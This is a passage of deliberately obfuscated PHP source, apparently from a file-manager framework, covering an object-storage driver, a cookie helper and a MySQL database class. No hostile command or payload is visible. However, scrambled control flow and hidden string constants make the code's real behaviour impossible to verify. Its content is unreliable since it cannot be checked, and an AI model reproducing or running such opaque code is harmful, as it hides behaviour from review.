$b¾¹ÄÓìŸö); } if ($C­éÒï«šº === null) { break; } continue; } if ($A”Ö©ª÷È…) { if (!empty($CøÙ‡ÅŠÂÃ)) { if (count($CøÙ‡ÅŠÂÃ) > 1 || isset($CøÙ‡ÅŠÂÃ[0][$b¨Øëäì•„[28]]) && $CøÙ‡ÅŠÂÃ[0][$b¨Øëäì•„[28]] != $Bºªî¾®Ì†) { return !0; } } } else { if (!empty($b¾¹ÄÓìŸö)) { return !0; } } if ($C­éÒï«šº === null) { break; } } if ($C†Ó×›¥ù“) { $c‚µ¬àÙºµ = array_diff($c‚µ¬àÙºµ, array($Bºªî¾®Ì†)); $c‚µ¬àÙºµ = count(array_unique($c‚µ¬àÙºµ)); $Aç„‹È´±ø = count(array_unique($Aç„‹È´±ø)); return array($b¨Øëäì•„[203] => $c‚µ¬àÙºµ, $b¨Øëäì•„[204] => $Aç„‹È´±ø); } goto d¼ãÎ·Â†¿; BÔ »ÊÏ…ˆ: $b¨Øëäì•„ =& $_SERVER[Ö‘Øù]; $föÀÇåËå‰ = trim($föÀÇåËå‰, $b¨Øëäì•„[8]); $Bºªî¾®Ì† = empty($föÀÇåËå‰) && $föÀÇåËå‰ !== $b¨Øëäì•„[191] ? $b¨Øëäì•„[33] : $föÀÇåËå‰ . $b¨Øëäì•„[8]; goto aÌùÁë; aÌùÁë: $C­éÒï«šº = null; $b‚àÄÄ³ã = 500; $C­éƒÍğÏ“ = $b¨Øëäì•„[8]; goto C§É¯ªùªğ; d¼ãÎ·Â†¿: return !1; goto BÌ¼æ×ÊÛš; BÌ¼æ×ÊÛš: } public function listAll($bîä®¸Ô—¾) { $fÙ ß¦Ù˜ =& $_SERVER[Ö‘Øù]; $C‹´¶É©İø = $this->fileList($bîä®¸Ô—¾, $fÙ ß¦Ù˜[33], !0); $fæÅÚµ—„Ì = array(); foreach ($C‹´¶É©İø[$fÙ ß¦Ù˜[74]] as $a†»¢Ä‡Ï) { $fæÅÚµ—„Ì[$a†»¢Ä‡Ï[$fÙ ß¦Ù˜[28]]] = $a†»¢Ä‡Ï[$fÙ ß¦Ù˜[78]]; } foreach ($C‹´¶É©İø[$fÙ ß¦Ù˜[75]] as $a†»¢Ä‡Ï) { if (is_string($a†»¢Ä‡Ï)) { $fæÅÚµ—„Ì[$a†»¢Ä‡Ï] = 0; } } return $this->listAllFiles($bîä®¸Ô—¾, array_keys($fæÅÚµ—„Ì), $fæÅÚµ—„Ì); } public function canRead($aøËÀĞ®ƒï) { $b¨³‹Ã¥—í =& $_SERVER[Ö‘Øù]; $aĞ¸Ò‚ÂŠà = $this->client->getAccessControlPolicy($this->bucket, $aøËÀĞ®ƒï); if (!$aĞ¸Ò‚ÂŠà) { return !1; } return in_array($aĞ¸Ò‚ÂŠà, array($b¨³‹Ã¥—í[205], $b¨³‹Ã¥—í[206], $b¨³‹Ã¥—í[207])) ? !0 : !1; } public function canWrite($cô´Àâ˜Ò‹) { $F¢Õ…„œ†ª =& $_SERVER[Ö‘Øù]; $dœ£—ÀãöÖ = $this->client->getAccessControlPolicy($this->bucket, $cô´Àâ˜Ò‹); if (!$dœ£—ÀãöÖ) { return !1; } return in_array($dœ£—ÀãöÖ, array($F¢Õ…„œ†ª[205], $F¢Õ…„œ†ª[206])) ? !0 : !1; } public function getContent($B•ƒÇšõÈ) { return $this->client->getObject($this->bucket, $B•ƒÇšõÈ); } public function setContent($a°¥ÏŸ±Øè, $E¢šÇ‘º¾Á = '', $B‚íŠÑ„çÉ = false) { goto b¿Ÿº«¸ïã; d¾…šîëÌÆ: $this->cacheMethod(null, null); $E‚áĞŒÀ·¾ = $this->copyFile($a°¥ÏŸ±Øè, $a°¥ÏŸ±Øè, array($cºˆÅŸºÚğ[208] => $E‚áĞŒÀ·¾[$cºˆÅŸºÚğ[209]])); return $E‚áĞŒÀ·¾ ? !0 : !1; goto BîĞˆ´Ç; cØèÌ¶§“ª: $E‚áĞŒÀ·¾ = $this->client->putObject($E¢šÇ‘º¾Á, $this->bucket, $a°¥ÏŸ±Øè, $cºˆÅŸºÚğ[192], array(), $b¹­ôš«‘); if (!$E‚áĞŒÀ·¾) { return !1; } if ($B‚íŠÑ„çÉ) { return !0; } goto d¾…šîëÌÆ; b¿Ÿº«¸ïã: $cºˆÅŸºÚğ =& $_SERVER[Ö‘Øù]; $a°¥ÏŸ±Øè = $B‚íŠÑ„çÉ ? trim($a°¥ÏŸ±Øè, $cºˆÅŸºÚğ[8]) . $cºˆÅŸºÚğ[8] : $a°¥ÏŸ±Øè; $b¹­ôš«‘ = get_file_mime(get_path_ext($a°¥ÏŸ±Øè)); goto cØèÌ¶§“ª; BîĞˆ´Ç: } public function fileSubstr($C–©”šÆ, $A« ˜éè®, $dÊ’Ü˜‘“ ) { $bØŞİ£¸‡£ = $A« ˜éè® + $dÊ’Ü˜‘“  - 1; return $this->client->getObject($this->bucket, $C–©”šÆ, array($_SERVER[Ö‘Øù][210] => "\142\x79\x74\145\x73\75{$A« ˜éè®}\55{$bØŞİ£¸‡£}")); } public function upload($C«àâğ¤, $E«Ô¹¦½¡, $A»µÜÜª¿Œ = false, $EÍ¨íÅƒ‡Û = REPEAT_REPLACE) { $cŠÔòïÌ¾õ =& $_SERVER[Ö‘Øù]; $Fğ¬óÜƒ×¤ = array($cŠÔòïÌ¾õ[208] => @md5_file($E«Ô¹¦½¡)); $B•Ş‡»Ã—“ = array($cŠÔòïÌ¾õ[211] => get_file_mime(get_path_ext($C«àâğ¤))); if (IO::size($E«Ô¹¦½¡) <= 1024 * 1024 * 200) { $EâÚÛŒµÈ¶ = $this->client->putObjectFile($E«Ô¹¦½¡, $this->bucket, $C«àâğ¤, $cŠÔòïÌ¾õ[192], $Fğ¬óÜƒ×¤, $B•Ş‡»Ã—“); return !empty($EâÚÛŒµÈ¶) ? $this->getPathOuter($C«àâğ¤) : !1; } $D³ÂŸôá‡î = $this->client->multiUploadObject($E«Ô¹¦½¡, $this->bucket, trim($C«àâğ¤, $cŠÔòïÌ¾õ[8]), $Fğ¬óÜƒ×¤, $B•Ş‡»Ã—“); return $D³ÂŸôá‡î ? $this->getPathOuter($C«àâğ¤) : !1; } public function download($CŒœ¢³‰‚…, $Fò‘œ»Šõä) { if (!@is_dir($this->pathFather($Fò‘œ»Šõä)) && !IO::mkdir($this->pathFather($Fò‘œ»Šõä))) { return !1; } $dîºá™ïº¬ = $this->client->getObject($this->bucket, $CŒœ¢³‰‚…, array(), $Fò‘œ»Šõä); return $dîºá™ïº¬ !== !1 ? $Fò‘œ»Šõä : !1; } public function link($e‹È„øÖ‚´, $Dâ”¥¸´¨ = array()) { $fã‡—Éºî =& $_SERVER[Ö‘Øù]; if ($this->signVer == $fã‡—Éºî[212]) { return $this->client->getAuthenticatedURL($this->bucket, $e‹È„øÖ‚´, 3600 * 12, $Dâ”¥¸´¨); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($e‹È„øÖ‚´, $fã‡—Éºî[8]), 3600 * 12, $this->region, array(), !0, $Dâ”¥¸´¨); } public function fileOut($CŠóØ…á— , $Cäì‚²—çá = false, $C˜–ÚÂ§ÀÂ = false, $bÃÜ‡ö°Š = '') { goto EªĞ‡¡Ñæ­; B•æÆ§ªÜæ: $a¾Ğİ£Ğá = array($cÜƒœ‘ÂğÛ[216] => $Cäì‚²—çá . $cÜƒœ‘ÂğÛ[217] . rawurlencode($C˜–ÚÂ§ÀÂ), $cÜƒœ‘ÂğÛ[218] => $fùäº¬Û÷­); $b ¦”½¸Ç› = $this->link($CŠóØ…á— , $a¾Ğİ£Ğá); $this->fileOutLink($b ¦”½¸Ç›); goto Eéáñ®í”õ; bõÛĞˆš¬Ì: $fùäº¬Û÷­ = get_file_mime(get_path_ext($C˜–ÚÂ§ÀÂ)); if ($fùäº¬Û÷­ == $cÜƒœ‘ÂğÛ[213]) { return parent::fileOut($CŠóØ…á— , $Cäì‚²—çá, $C˜–ÚÂ§ÀÂ, $bÃÜ‡ö°Š); } $Cäì‚²—çá = $Cäì‚²—çá ? $cÜƒœ‘ÂğÛ[214] : $cÜƒœ‘ÂğÛ[215]; goto B•æÆ§ªÜæ; EªĞ‡¡Ñæ­: $cÜƒœ‘ÂğÛ =& $_SERVER[Ö‘Øù]; if ($this->isFileOutServer()) { return $this->fileOutServer($CŠóØ…á— , $Cäì‚²—çá, $C˜–ÚÂ§ÀÂ, $bÃÜ‡ö°Š); } if (!$C˜–ÚÂ§ÀÂ) { $C˜–ÚÂ§ÀÂ = $this->pathThis($CŠóØ…á— ); } goto bõÛĞˆš¬Ì; Eéáñ®í”õ: } public function fileOutServer($DÑ—ŒÌôøÑ, $AáòÒŒÀ® = false, $eåˆ¯¯ºàĞ = false, $dŸ¸°§Ì¢Ø = '') { parent::fileOut($DÑ—ŒÌôøÑ, $AáòÒŒÀ®, $eåˆ¯¯ºàĞ, $dŸ¸°§Ì¢Ø); } public function fileOutImageServer($FöÊ¿‘“, $d“ˆ¼¦—ÏÏ = 250) { parent::fileOutImage($FöÊ¿‘“, $d“ˆ¼¦—ÏÏ); } public function hashMd5($c½ÌÎë¹º, $c« Ãñ¯„Í = '') { $BÚ¸ã°‰æÎ =& $_SERVER[Ö‘Øù]; $fŠÜ¶¬¾šà = $this->objectMeta($c½ÌÎë¹º); if (!$fŠÜ¶¬¾šà) { return !1; } $c« Ãñ¯„Í = $c« Ãñ¯„Í ? $c« Ãñ¯„Í : _get($fŠÜ¶¬¾šà, $BÚ¸ã°‰æÎ[219]); $c« Ãñ¯„Í = $c« Ãñ¯„Í ? $c« Ãñ¯„Í : _get($fŠÜ¶¬¾šà, $BÚ¸ã°‰æÎ[209], $BÚ¸ã°‰æÎ[33]); return $c« Ãñ¯„Í; } public function uploadFormData($dĞ‚­„Îõ, $E´Úå¢ˆó† = 3600) { $D—‰À±çŠ¹ =& $_SERVER[Ö‘Øù]; $dºí«¾œ¾Í = $this->pathFather($dĞ‚­„Îõ); $EÓ ÕÖğ‡î = $this->client->getHttpUploadPostParams($this->bucket, $dºí«¾œ¾Í, $D—‰À±çŠ¹[192], $E´Úå¢ˆó†); return array_merge((array) $EÓ ÕÖğ‡î, array($D—‰À±çŠ¹[175] => $this->getHost())); } public function multiUploadFormData($a Ú¶ÂÅ±­, $e‰äòˆ¯¼¹ = 3600) { $Díš›×ª˜ =& $_SERVER[Ö‘Øù]; $cÁŸà»™Ú¯ = gmdate($Díš›×ª˜[220]); $AçƒÒ‚Ñğç = array(); $cÊ¯’›¸µ¢ = $this->client->getUploadId($this->bucket, $a Ú¶ÂÅ±­, $AçƒÒ‚Ñğç); if (!$cÊ¯’›¸µ¢) { return !1; } return array($Díš›×ª˜[221] => $cÊ¯’›¸µ¢, $Díš›×ª˜[175] => $this->getHost() . $Díš›×ª˜[8] . $this->pathEncode($a Ú¶ÂÅ±­), $Díš›×ª˜[222] => $cÁŸà»™Ú¯, $Díš›×ª˜[93] => $a Ú¶ÂÅ±­); } public function multiUploadAuthData($F«µãªÇƒ, $bÈ³áí¥Á = array()) { goto eÊ¿æ·®™…; fÁèÈØ°Í¿: if (strpos($cÃãëİ¦êì, $F‰¨®Œ¶†[225]) === 0) { return array($F‰¨®Œ¶†[232] => $F¼ğˆø¤¼, $F‰¨®Œ¶†[222] => $FšŞ‡èšÅá); } return $F¼ğˆø¤¼; goto FÑ¤”Ş¼…±; Eä‘àâæÏŸ: $fğçŒŒÏ‹ = implode($F‰¨®Œ¶†[229], $dˆ‘©Î¶½«); $Aôª©²…ƒ¼ = base64_encode(hash_hmac($F‰¨®Œ¶†[230], $fğçŒŒÏ‹, $this->secret, !0)); $F¼ğˆø¤¼ = $F‰¨®Œ¶†[231] . $this->accessKey . $F‰¨®Œ¶†[4] . $Aôª©²…ƒ¼; goto fÁèÈØ°Í¿; eÊ¿æ·®™…: $F‰¨®Œ¶† =& $_SERVER[Ö‘Øù]; $FšŞ‡èšÅá = isset($bÈ³áí¥Á[$F‰¨®Œ¶†[222]]) ? $bÈ³áí¥Á[$F‰¨®Œ¶†[222]] : gmdate($F‰¨®Œ¶†[220]); $cÃãëİ¦êì = isset($bÈ³áí¥Á[$F‰¨®Œ¶†[168]]) ? $bÈ³áí¥Á[$F‰¨®Œ¶†[168]] : $F‰¨®Œ¶†[33]; goto Fíñ×–¡„…; Fíñ×–¡„…: $BÚùêÕèÄ§ = $bÈ³áí¥Á[$F‰¨®Œ¶†[93]]; unset($bÈ³áí¥Á[$F‰¨®Œ¶†[93]]); if (isset($bÈ³áí¥Á[$F‰¨®Œ¶†[223]])) { $bÈ³áí¥Á[$F‰¨®Œ¶†[222]] = $FšŞ‡èšÅá; return $this->listUploadParts($BÚùêÕèÄ§, $bÈ³áí¥Á); } goto B÷·®‡îõØ; B÷·®‡îõØ: $dˆ‘©Î¶½« = array($F‰¨®Œ¶†[224], $F‰¨®Œ¶†[33], $F‰¨®Œ¶†[119], $F‰¨®Œ¶†[33], "\170\x2d\141\155\172\x2d\144\x61\164\x65\x3a{$FšŞ‡èšÅá}", $F‰¨®Œ¶†[8] . $this->bucket . $F‰¨®Œ¶†[8] . $this->pathEncode($BÚùêÕèÄ§) . $cÃãëİ¦êì); if (strpos($cÃãëİ¦êì, $F‰¨®Œ¶†[225]) === 0) { $dˆ‘©Î¶½«[0] = $F‰¨®Œ¶†[226]; } if (isset($bÈ³áí¥Á[$F‰¨®Œ¶†[227]]) && $bÈ³áí¥Á[$F‰¨®Œ¶†[227]] == $F‰¨®Œ¶†[228]) { $dˆ‘©Î¶½«[0] = $F‰¨®Œ¶†[228]; } goto Eä‘àâæÏŸ; FÑ¤”Ş¼…±: } public function listUploadParts($AÅ‰Ú‰íÀ×, $cã¢Å«ÜÀ« = array()) { goto b½¼˜©¸”ù; CëÏƒƒÊ: $FÄ°ÈÏ‹è = $this->multiUploadAuthData($AÅ‰Ú‰íÀ×, $cã¢Å«ÜÀ«); if (empty($FÄ°ÈÏ‹è)) { return !1; } return array($c±Š—ÕöšÏ[232] => $FÄ°ÈÏ‹è, $c±Š—ÕöšÏ[222] => $cã¢Å«ÜÀ«[$c±Š—ÕöšÏ[222]], $c±Š—ÕöšÏ[234] => $Eàç±ÈÏç); goto a‡Ëà¿ÊØ; då˜¢ÁğÌÍ: if (!$Eàç±ÈÏç) { return !1; } unset($cã¢Å«ÜÀ«[$c±Š—ÕöšÏ[223]], $cã¢Å«ÜÀ«[$c±Š—ÕöšÏ[227]]); $cã¢Å«ÜÀ«[$c±Š—ÕöšÏ[93]] = $AÅ‰Ú‰íÀ×; goto CëÏƒƒÊ; b½¼˜©¸”ù: $c±Š—ÕöšÏ =& $_SERVER[Ö‘Øù]; $D Óæ¢•´ = str_replace($c±Š—ÕöšÏ[233], $c±Š—ÕöšÏ[33], $cã¢Å«ÜÀ«[$c±Š—ÕöšÏ[168]]); $Eàç±ÈÏç = $this->client->listParts($this->bucket, $AÅ‰Ú‰íÀ×, $D Óæ¢•´); goto då˜¢ÁğÌÍ; a‡Ëà¿ÊØ: } public function getHost() { return parent::getHost() . $_SERVER[Ö‘Øù][8] . $this->bucket; } public function size($e…ºÊÈî÷) { $bÃ†óÙãÆ² = $this->objectMeta($e…ºÊÈî÷); return $bÃ†óÙãÆ² ? $bÃ†óÙãÆ²[$_SERVER[Ö‘Øù][78]] : 0; } public function info($fˆ£ø™†ğ) { if ($this->isFolder($fˆ£ø™†ğ)) { return $this->folderInfo($fˆ£ø™†ğ); } else { if ($this->isFile($fˆ£ø™†ğ)) { return $this->fileInfo($fˆ£ø™†ğ); } } return !1; } public function exist($F¾õù§ÎÇ) { return $this->isFile($F¾õù§ÎÇ) || $this->isFolder($F¾õù§ÎÇ); } public function isFile($b£ ŠøÅí¯) { return !$this->isFolder($b£ ŠøÅí¯) && $this->objectMeta($b£ ŠøÅí¯); } public function isFolder($còãÜ®©ÓŞ) { return $this->cacheMethod($_SERVER[Ö‘Øù][199], $còãÜ®©ÓŞ); } protected function objectMeta($A¼Ş©¶­Œ¼) { return $this->cacheMethod($_SERVER[Ö‘Øù][200], $A¼Ş©¶­Œ¼); } protected function _objectMeta($a¬³À¡™Äƒ) { $aÄÚÊ´›ƒ =& $_SERVER[Ö‘Øù]; $a¬³À¡™Äƒ = rtrim($a¬³À¡™Äƒ, $aÄÚÊ´›ƒ[8]); try { $b¡œåÚîÓ‡ = $this->client->getObjectInfo($this->bucket, $a¬³À¡™Äƒ); if (!isset($b¡œåÚîÓ‡[$aÄÚÊ´›ƒ[219]]) && isset($b¡œåÚîÓ‡[$aÄÚÊ´›ƒ[235]])) { $b¡œåÚîÓ‡[$aÄÚÊ´›ƒ[219]] = $b¡œåÚîÓ‡[$aÄÚÊ´›ƒ[235]]; } } catch (Exception $bŠˆÒ¼ºˆÎ) { $b¡œåÚîÓ‡ = !1; } if (!$b¡œåÚîÓ‡) { } return $b¡œåÚîÓ‡; } protected function _isFolder($bŠÆ®Ï‹’µ) { goto bÀùÔïÙíÈ; b®¥ƒÊµÄ: return !0; goto EÓ¨Ú›½êù; Cğ‡×Òè: return stripos($D¯‹†ä¨ä, $bŠÆ®Ï‹’µ . $däê÷ÕŸ¶¤[8]) === 0 ? !0 : !1; if (substr($D¯‹†ä¨ä, -1) == $däê÷ÕŸ¶¤[8]) { return !0; } if (get_path_this($D¯‹†ä¨ä) == get_path_this($bŠÆ®Ï‹’µ)) { return !1; } goto b®¥ƒÊµÄ; b¸¿‰¼“Ï: $fµ‚Üå»ØÄ = $this->client->getBucket($this->bucket, $bŠÆ®Ï‹’µ, null, 1); if (empty($fµ‚Üå»ØÄ[$däê÷ÕŸ¶¤[198]])) { return !1; } $D¯‹†ä¨ä = $fµ‚Üå»ØÄ[$däê÷ÕŸ¶¤[198]][0][$däê÷ÕŸ¶¤[28]]; goto Cğ‡×Òè; bÀùÔïÙíÈ: $däê÷ÕŸ¶¤ =& $_SERVER[Ö‘Øù]; $bŠÆ®Ï‹’µ = rtrim($bŠÆ®Ï‹’µ, $däê÷ÕŸ¶¤[8]); if ($bŠÆ®Ï‹’µ == $däê÷ÕŸ¶¤[33] || $bŠÆ®Ï‹’µ == $däê÷ÕŸ¶¤[8]) { return !0; } goto b¸¿‰¼“Ï; EÓ¨Ú›½êù: } } define($_SERVER[Ö‘Øù][236], 1); goto Còá±¥º; b„÷ˆ¢ñÁ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($cÉ™¦èÁƒ = '', $D‹äÚÊ‡Ê¡ = 0) { if (is_string($cÉ™¦èÁƒ) && $cÉ™¦èÁƒ != $_SERVER[Ö‘Øù][33]) { $this->prefix = $cÉ™¦èÁƒ; } if (is_numeric($D‹äÚÊ‡Ê¡) && $D‹äÚÊ‡Ê¡ > 0) { $this->expire = $D‹äÚÊ‡Ê¡; } } public static function getInstance() { static $e‹÷ŒóÖ˜; if ($e‹÷ŒóÖ˜ === null) { $e‹÷ŒóÖ˜ = new self(); } return $e‹÷ŒóÖ˜; } private static $cookieDisable = false; public static function disable($B‘—ÇâÉßÇ) { self::$cookieDisable = $B‘—ÇâÉßÇ; } private static $sameCookieSet = array(); public static function set($d¢ª¶çÛ•ç, $Cé‡ì×‡¬É, $Cí˜ôº¸™Æ = 0, $AØÑğê’¢Ñ = false, $E×Áöƒ˜Ãë = false) { goto B›˜·Ó”¬; fŠ†Ğ•Ö¹: $ešå±¶Æà = $cßÔÕˆÌ[33]; setcookie($d¢ª¶çÛ•ç, $Cé‡ì×‡¬É, time() + $Cí˜ôº¸™Æ, $cßÔÕˆÌ[8] . trim($E×Áöƒ˜Ãë, $cßÔÕˆÌ[8]) . $ešå±¶Æà, !1, !1, $AØÑğê’¢Ñ); goto DæãÍˆ”ÁĞ; B›˜·Ó”¬: $cßÔÕˆÌ =& $_SERVER[Ö‘Øù]; if (self::$cookieDisable) { return; } if (!$Cí˜ôº¸™Æ) { $Cí˜ôº¸™Æ = 24 * 3600 * 7; } goto eöÏÈŸˆè®; eöÏÈŸˆè®: if (isset(self::$sameCookieSet[$d¢ª¶çÛ•ç]) && self::$sameCookieSet[$d¢ª¶çÛ•ç] == $Cé‡ì×‡¬É . $Cí˜ôº¸™Æ) { return; } self::$sameCookieSet[$d¢ª¶çÛ•ç] = $Cé‡ì×‡¬É . $Cí˜ôº¸™Æ; if (!$E×Áöƒ˜Ãë) { $E×Áöƒ˜Ãë = str_replace(HOST, $cßÔÕˆÌ[33], APP_HOST); $E×Áöƒ˜Ãë = _get($GLOBALS, $cßÔÕˆÌ[879], $E×Áöƒ˜Ãë); } goto fŠ†Ğ•Ö¹; DæãÍˆ”ÁĞ: } public static function setSafe($b‚ÔôâÏë™, $eéÁÒª£‚Ò, $e·Âó˜áÁ = 0) { self::set($b‚ÔôâÏë™, $eéÁÒª£‚Ò, $e·Âó˜áÁ, !0); } public static function get($FÈƒç“Ö•) { return isset($_COOKIE[$FÈƒç“Ö•]) ? $_COOKIE[$FÈƒç“Ö•] : !1; } public static function remove($Dï°ÅÜĞğ, $FùøãäĞƒ• = false) { unset($_COOKIE[$Dï°ÅÜĞğ]); self::set($Dï°ÅÜĞğ, $_SERVER[Ö‘Øù][33], 1, $FùøãäĞƒ•); } } class DbMysql extends Db { public function __construct($eÎø»ç÷§‡ = '') { $F„›é§ƒ¥ =& $_SERVER[Ö‘Øù]; if (!extension_loaded($F„›é§ƒ¥[794])) { think_exception(think_lang($F„›é§ƒ¥[10]) . $F„›é§ƒ¥[880]); } if (!empty($eÎø»ç÷§‡)) { $this->config = $eÎø»ç÷§‡; if (empty($this->config[$F„›é§ƒ¥[13]])) { $this->config[$F„›é§ƒ¥[13]] = $F„›é§ƒ¥[33]; } } } public function connect($c£İöŒ±Œ„ = '', $AìŸê¦Š‘Œ = 0, $FÊ°İ®…İ = false) { $Bæ·åÈ©› =& $_SERVER[Ö‘Øù]; if (!isset($this->linkID[$AìŸê¦Š‘Œ])) { goto bî¸È¸çŒß; bî¸È¸çŒß: if (empty($c£İöŒ±Œ„)) { $c£İöŒ±Œ„ = $this->config; } $dßÁŞ¼ƒÁ° = $c£İöŒ±Œ„[$Bæ·åÈ©›[881]] . ($c£İöŒ±Œ„[$Bæ·åÈ©›[882]] ? "\x3a{$c£İöŒ±Œ„[$Bæ·åÈ©›[882]]}" : $Bæ·åÈ©›[33]); $E˜ÕÜæ†âˆ = !empty($c£İöŒ±Œ„[$Bæ·åÈ©›[13]][$Bæ·åÈ©›[14]]) ? $c£İöŒ±Œ„[$Bæ·åÈ©›[13]][$Bæ·åÈ©›[14]] : $this->pconnect; goto eÃ¬Ü¤ˆèƒ; FÉØ‘ÍõŞ: if (1 != think_config($Bæ·åÈ©›[18])) { unset($this->config); } goto eÖ·—ëÑƒÈ; eÃ¬Ü¤ˆèƒ: if ($E˜ÕÜæ†âˆ) { $this->linkID[$AìŸê¦Š‘Œ] = mysql_pconnect($dßÁŞ¼ƒÁ°, $c£İöŒ±Œ„[$Bæ·åÈ©›[883]], $c£İöŒ±Œ„[$Bæ·åÈ©›[884]], 131072); } else { $this->linkID[$AìŸê¦Š‘Œ] = mysql_connect($dßÁŞ¼ƒÁ°, $c£İöŒ±Œ„[$Bæ·åÈ©›[883]], $c£İöŒ±Œ„[$Bæ·åÈ©›[884]], !0, 131072); } if (!$this->linkID[$AìŸê¦Š‘Œ] || !empty($c£İöŒ±Œ„[$Bæ·åÈ©›[17]]) && !mysql_select_db($c£İöŒ±Œ„[$Bæ·åÈ©›[17]], $this->linkID[$AìŸê¦Š‘Œ])) { think_exception(mysql_error()); } $F®ÊÕø§‘Õ = mysql_get_server_info($this->linkID[$AìŸê¦Š‘Œ]); goto bÅ”Ù±ò•; bÅ”Ù±ò•: mysql_query($Bæ·åÈ©›[885] . think_config($Bæ·åÈ©›[886]) . $Bæ·åÈ©›[55], $this->linkID[$AìŸê¦Š‘Œ]); if ($F®ÊÕø§‘Õ > $Bæ·åÈ©›[887]) { mysql_query($Bæ·åÈ©›[888], $this->linkID[$AìŸê¦Š‘Œ]); } $this->connected = !0; goto FÉØ‘ÍõŞ; eÖ·—ëÑƒÈ: } return $this->linkID[$AìŸê¦Š‘Œ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CˆôÛƒö•è) { goto cåøè‚¹©; B¹Ö¤Ï“ËŞ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto b©ºÖù²Ñª; a…´¤˜º¸: think_action_status($e˜ÏË‰»”ä[19], 1); think_status($e˜ÏË‰»”ä[20]); $this->queryID = mysql_query($CˆôÛƒö•è, $this->_linkID); goto B¹Ö¤Ï“ËŞ; fçò“‚¥·ˆ: if (!$this->_linkID) { return !1; } $this->queryStr = $CˆôÛƒö•è; if ($this->queryID) { $this->free(); } goto a…´¤˜º¸; cåøè‚¹©: $e˜ÏË‰»”ä =& $_SERVER[Ö‘Øù]; if (0 === stripos($CˆôÛƒö•è, $e˜ÏË‰»”ä[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fçò“‚¥·ˆ; b©ºÖù²Ñª: } public function execute($Eö¹â¦øé™) { goto eµ…±Ì¦Ş¸; eµ…±Ì¦Ş¸: $c¦ÊÉ¼×Ç =& $_SERVER[Ö‘Øù]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dª ôÛ…áó; CíÌ¨¿‹Šƒ: think_status($c¦ÊÉ¼×Ç[20]); $DÈ“ŠÊ×› = mysql_query($Eö¹â¦øé™, $this->_linkID); $this->debug(); goto DÅ”®£ˆ·¿; dª ôÛ…áó: $this->queryStr = $Eö¹â¦øé™; if ($this->queryID) { $this->free(); } think_action_status($c¦ÊÉ¼×Ç[21], 1); goto CíÌ¨¿‹Šƒ; DÅ”®£ˆ·¿: if (!1 === $DÈ“ŠÊ×›) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto F»ƒ³»¶¿; F»ƒ³»¶¿: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ö‘Øù][889], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eË¨¬øÕ‚¥ = mysql_query($_SERVER[Ö‘Øù][890], $this->_linkID); $this->transTimes = 0; if (!$eË¨¬øÕ‚¥) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¹¤¨Á„‹­ = mysql_query($_SERVER[Ö‘Øù][891], $this->_linkID); $this->transTimes = 0; if (!$D¹¤¨Á„‹­) { $this->error(); return !1; } } return !0; } private function getAll() { $Bïƒ½…Éî = array(); if ($this->numRows > 0) { while ($Bæİ­ˆ¢£¸ = mysql_fetch_assoc($this->queryID)) { $Bïƒ½…Éî[] = $Bæİ­ˆ¢£¸; } mysql_data_seek($this->queryID, 0); } return $Bïƒ½…Éî; } public function getFields($bŸ¶°¤›í¨) { $B‡œ‰‘Ó— =& $_SERVER[Ö‘Øù]; $Eäò¿ İ— = $this->query($B‡œ‰‘Ó—[892] . $this->parseKey($bŸ¶°¤›í¨)); $Böš­ÎÙéÏ = array(); if ($Eäò¿ İ—) { foreach ($Eäò¿ İ— as $f¶‰¢œñ„Ò => $E³óØºš) { $Böš­ÎÙéÏ[$E³óØºš[$B‡œ‰‘Ó—[27]]] = array($B‡œ‰‘Ó—[28] => $E³óØºš[$B‡œ‰‘Ó—[27]], $B‡œ‰‘Ó—[29] => $E³óØºš[$B‡œ‰‘Ó—[30]], $B‡œ‰‘Ó—[31] => (bool) (strtoupper($E³óØºš[$B‡œ‰‘Ó—[32]]) === $B‡œ‰‘Ó—[893]), $B‡œ‰‘Ó—[34] => $E³óØºš[$B‡œ‰‘Ó—[35]], $B‡œ‰‘Ó—[36] => strtolower($E³óØºš[$B‡œ‰‘Ó—[37]]) == $B‡œ‰‘Ó—[38], $B‡œ‰‘Ó—[39] => strtolower($E³óØºš[$B‡œ‰‘Ó—[40]]) == $B‡œ‰‘Ó—[41]); } } return $Böš­ÎÙéÏ; } public function getTables($a‰ñ…Ø‡Ó = '') { $a³¨¸ô«ˆ =& $_SERVER[Ö‘Øù]; if (!empty($a‰ñ…Ø‡Ó)) { $CÏùí„¸¸ù = $a³¨¸ô«ˆ[894] . $a‰ñ…Ø‡Ó . $a³¨¸ô«ˆ[895]; } else { $CÏùí„¸¸ù = $a³¨¸ô«ˆ[896]; } $CŠ‡­”áå = $this->query($CÏùí„¸¸ù); $b§³Ó‰„˜Ø = array(); foreach ($CŠ‡­”áå as $FéšÃĞš => $Dæ³ÀÔ“…) { $b§³Ó‰„˜Ø[$FéšÃĞš] = current($Dæ³ÀÔ“…); } return $b§³Ó‰„˜Ø; } public function replace($B™ôàìÙ±, $FŠ©½™–¨ = array()) { $C²éÛÙÉÎ¼ =& $_SERVER[Ö‘Øù]; foreach ($B™ôàìÙ± as $c£Ÿ§Ø÷ => $Aî£¥îËé¿) { $DÌ¦®ÙÖÃƒ = $this->parseValue($Aî£¥îËé¿); if (is_scalar($DÌ¦®ÙÖÃƒ)) { $Dõ±ğÖÄ¨[] = $DÌ¦®ÙÖÃƒ; $dõøˆãªÎÔ[] = $this->parseKey($c£Ÿ§Ø÷); } } $b¿…‡î»ë’ = $C²éÛÙÉÎ¼[897] . $this->parseTable($FŠ©½™–¨[$C²éÛÙÉÎ¼[277]]) . $C²éÛÙÉÎ¼[898] . implode($C²éÛÙÉÎ¼[47], $dõøˆãªÎÔ) . $C²éÛÙÉÎ¼[899] . implode($C²éÛÙÉÎ¼[47], $Dõ±ğÖÄ¨) . $C²éÛÙÉÎ¼[900]; return $this->execute($b¿…‡î»ë’); } 